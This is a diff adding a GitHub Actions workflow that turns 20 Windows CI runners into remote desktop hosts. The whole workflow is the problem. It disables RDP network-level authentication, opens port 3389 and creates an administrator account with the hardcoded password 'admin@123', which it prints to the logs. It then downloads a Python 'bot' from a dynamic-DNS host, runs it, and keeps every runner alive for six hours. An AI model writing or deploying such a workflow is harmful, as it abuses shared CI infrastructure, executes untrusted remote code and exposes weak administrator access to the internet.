@@ -1,0 +1,136 @@
+name: RDP on Old Windows Versions Only
+
+on:
+  workflow_dispatch:
+
+jobs:
+  setup-rdp:
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - os: windows-2019
+            server: 1
+          - os: windows-2019
+            server: 2
+          - os: windows-2019
+            server: 3
+          - os: windows-2019
+            server: 4
+          - os: windows-2019
+            server: 5
+          - os: windows-2019
+            server: 6
+          - os: windows-2019
+            server: 7
+          - os: windows-2019
+            server: 8
+          - os: windows-2019
+            server: 9
+          - os: windows-2019
+            server: 10
+          - os: windows-2022
+            server: 11
+          - os: windows-2022
+            server: 12
+          - os: windows-2022
+            server: 13
+          - os: windows-2022
+            server: 14
+          - os: windows-2022
+            server: 15
+          - os: windows-2022
+            server: 16
+          - os: windows-2022
+            server: 17
+          - os: windows-2022
+            server: 18
+          - os: windows-2022
+            server: 19
+          - os: windows-2022
+            server: 20
+
+    runs-on: ${{ matrix.os }}
+    timeout-minutes: 3600
+
+    steps:
+      - name: Enable RDP and Create User
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          netsh advfirewall firewall delete rule name="RDP" 2>$null
+          netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+          Restart-Service TermService -Force
+          $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
+          if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
+              Remove-LocalUser -Name "TOOLBOXLAP" -Force
+          }
+          New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
+          try {
+              $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          } catch {
+              $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          }
+          Write-Host ""
+          Write-Host "============================================"
+          Write-Host "RDP CONNECTION INFO"
+          Write-Host "============================================"
+          Write-Host "Server Number : ${{ matrix.server }}"
+          Write-Host "Windows OS    : ${{ matrix.os }}"
+          Write-Host "IP Address    : $ip"
+          Write-Host "Port          : 3389"
+          Write-Host "Username      : TOOLBOXLAP"
+          Write-Host "Password      : admin@123"
+          Write-Host "============================================"
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          $infoFile = "$desktop\RDP_INFO_SERVER_${{ matrix.server }}.txt"
+          "IP: $ip`nUser: TOOLBOXLAP`nPass: admin@123" | Out-File -FilePath $infoFile
+
+      - name: Download and Run Bot
+        shell: pwsh
+        run: |
+          $desktop = [Environment]::GetFolderPath("Desktop")
+          $botUrl = "http://ksa966.ddns.net:5000"
+          for ($i = 1; $i -le 3; $i++) {
+              try {
+                  Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30
+                  break
+              } catch {
+                  Start-Sleep -Seconds 5
+              }
+          }
+          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+          if (-not $pythonPath) {
+              $installer = "$env:TEMP\python.exe"
+              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
+              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+              Remove-Item $installer -Force
+              Start-Sleep -Seconds 10
+              $pythonPath = "C:\Python311\python.exe"
+          }
+          if (Test-Path "$desktop\bot.py") {
+              Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+          }
+
+      - name: Keep Alive for 6 Hours
+        shell: pwsh
+        run: |
+          $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+          $endTime = (Get-Date).AddHours(6)
+          Write-Host ""
+          Write-Host "Server ${{ matrix.server }} is ACTIVE"
+          Write-Host "RDP: $ip:3389"
+          Write-Host "User: TOOLBOXLAP"
+          Write-Host "Pass: admin@123"
+          Write-Host "Will run for 6 hours until: $endTime"
+          Write-Host ""
+          while ((Get-Date) -lt $endTime) {
+              Start-Sleep -Seconds 300
+              $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
+              Write-Host "[$(Get-Date)] Server ${{ matrix.server }} - $remaining minutes remaining - RDP: $ip"
+          }
+          Write-Host ""
+          Write-Host "Server ${{ matrix.server }} session completed (6 hours)"
